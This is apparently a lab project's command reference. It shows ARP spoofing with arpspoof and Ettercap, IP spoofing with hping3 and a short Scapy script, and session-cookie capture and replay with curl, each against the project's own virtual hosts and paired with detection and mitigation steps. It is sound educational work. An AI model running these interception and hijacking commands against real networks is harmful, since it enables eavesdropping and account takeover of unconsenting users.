# Command Reference

Every command below was actually run in the lab for this project. Each is
paired with the screenshot that shows its output. Replace the IPs with
your own lab's addressing if you reproduce this.

**Lab addressing used in this project**

| Role | OS | IP | MAC |
|---|---|---|---|
| Attacker | Kali Linux 2026.2 | 192.168.30.128 | 00:0c:29:eb:15:e2 |
| Victim | Windows 10 x64 | 192.168.30.129 | 00-0c-29-b2-a8-80 |
| Monitor | Kali Linux (2nd instance) | 192.168.30.130 | 00-0c-29-da-55-49 |
| Gateway | VMware virtual router | 192.168.30.1 | 00-50-56-c0-00-01 |

---

## 1. Lab baseline

```bash
# On the victim (Windows), before any attack — clean ARP cache
arp -a
```
📸 `screenshots/02-baseline-arp-table.png`

---

## 2. ARP Spoofing

### Method 1 — arpspoof (dsniff)

```bash
# On the attacker (Kali)
ip link show eth0                      # confirm attacker's own MAC
sudo sysctl -w net.ipv4.ip_forward=1   # enable IP forwarding (keeps victim connectivity)

# Terminal 1: poison the victim, impersonating the gateway
sudo arpspoof -i eth0 -t 192.168.30.129 192.168.30.1
```
📸 `screenshots/04-arpspoof-victim-terminal.png`

```bash
# Terminal 2: poison the gateway, impersonating the victim
sudo arpspoof -i eth0 -t 192.168.30.1 192.168.30.129
```
📸 `screenshots/05-arpspoof-gateway-terminal.png`

```bash
# On the victim, before vs after — confirms the poisoning
arp -a
```
📸 `screenshots/06-arp-table-before-after.png`

```bash
# On the monitor VM — independent confirmation via Wireshark
# Capture filter / display filter: arp
```
📸 `screenshots/07-wireshark-arp-flood-capture.png`

### Detection — Wireshark Expert Information

```
Wireshark → Analyze → Expert Information
```
Flags: **Warning — "Duplicate IP address configured"** (ARP/RARP group, 168 occurrences).
📸 `screenshots/08-wireshark-expert-info-duplicate-ip.png`

### Mitigation — static ARP entry

```bash
# On the victim (Windows, elevated Command Prompt)
# Pin the gateway's IP → MAC mapping so it can't be overwritten
netsh interface ipv4 add neighbors "Ethernet" 192.168.30.1 00-50-56-c0-00-01

# Re-check — the gateway entry is now "static" and survives a repeat attack
arp -a
```
📸 `screenshots/09-static-arp-mitigation.png`

### Method 2 — Ettercap (alternate tool)

```bash
# On the attacker (Kali) — text-mode to avoid local GUI rendering issues
sudo ettercap -T -q -M arp:remote /192.168.30.129// /192.168.30.1//
```
📸 `screenshots/10-ettercap-launch.png`
📸 `screenshots/11-wireshark-ettercap-confirmation.png`
📸 `screenshots/12-ettercap-arp-table-before-after.png`

---

## 3. IP Spoofing

### Method 1 — hping3

```bash
# On the attacker (Kali)
ip addr show eth0                                   # confirm real IP/MAC

sudo hping3 -1 -a 192.168.30.130 -c 5 192.168.30.129
# -1       ICMP mode
# -a       spoofed source address (claims to be the monitor VM)
# -c 5     send 5 packets
```
📸 `screenshots/14-hping3-spoofed-icmp.png`

Verify the Ethernet-MAC vs IP-source mismatch in Wireshark, captured on
both the attacker and the monitor VM:
📸 `screenshots/15-hping3-attacker-capture-mismatch.png`
📸 `screenshots/16-hping3-monitor-capture-mismatch.png`

### Method 2 — Scapy (scripted)

See [`scripts/ip_spoof.py`](scripts/ip_spoof.py).

```bash
sudo python3 -c "import scapy; print(scapy.__version__)"   # sanity check

nano ip_spoof.py        # write the script (shown below)
sudo python3 ip_spoof.py
```
📸 `screenshots/17-scapy-script.png`
📸 `screenshots/18-scapy-script-execution.png`
📸 `screenshots/19-wireshark-scapy-confirmation.png`

```python
from scapy.all import IP, ICMP, send

# Spoof the source IP: claims to be 192.168.30.130 (monitor VM),
# sent to the victim 192.168.30.129
packet = IP(src="192.168.30.130", dst="192.168.30.129") / ICMP()
send(packet, count=5, verbose=True)
```

### Mitigation — ingress/egress filtering (BCP 38)

Illustrative rule for a router/firewall (not directly enforceable in this
flat lab topology, since there is no intermediate router — shown as the
real-world control that applies):

```bash
iptables -A FORWARD -s 192.168.30.0/24 -i eth1 -j DROP
# Drops any packet claiming to originate from the internal subnet
# but arriving on an interface that subnet is not actually behind.
```

---

## 4. Session Hijacking

### Target application

A minimal Python `http.server`-based login app, served deliberately over
plain HTTP (no TLS), issuing a session cookie with no IP/browser binding.

### Capture the session cookie

```bash
# On the monitor VM — Wireshark, display filter: http
```
Reveals the `Set-Cookie` header in plaintext in the server's response.
📸 `screenshots/21-wireshark-cookie-plaintext.png`

Cross-check the same value client-side:
```
Browser → DevTools → Application/Storage → Cookies
```
📸 `screenshots/22-browser-devtools-cookie.png`

### Replay the stolen session

```bash
# From a second, never-authenticated machine
curl http://<target-ip>:8000/dashboard --cookie "session=<captured-value>"
# Returns the authenticated user's page content with no login step performed
```

### Mitigation

- Serve over **HTTPS/TLS** — the cookie is never visible in plaintext on the wire.
- Set the **`Secure`** flag (cookie never sent over plain HTTP) and **`HttpOnly`** (blocks client-side script access).
- **Bind sessions** to IP/user-agent and use short-lived, rotated tokens.

---

## Comparative summary

| Attack | Layer | Tools | Detection signal | Verified mitigation |
|---|---|---|---|---|
| ARP Spoofing | Data-link (L2) | arpspoof, Ettercap | "Duplicate IP address" warning (Wireshark Expert Info) | Static ARP entry for gateway |
| IP Spoofing | Network (L3) | hping3, Scapy | Ethernet MAC ≠ IP source address mismatch | Ingress/egress filtering (BCP 38) |
| Session Hijacking | Application (L7) | Wireshark, custom HTTP app | Session cookie visible in plaintext capture | HTTPS/TLS + `Secure`/`HttpOnly` cookie flags |
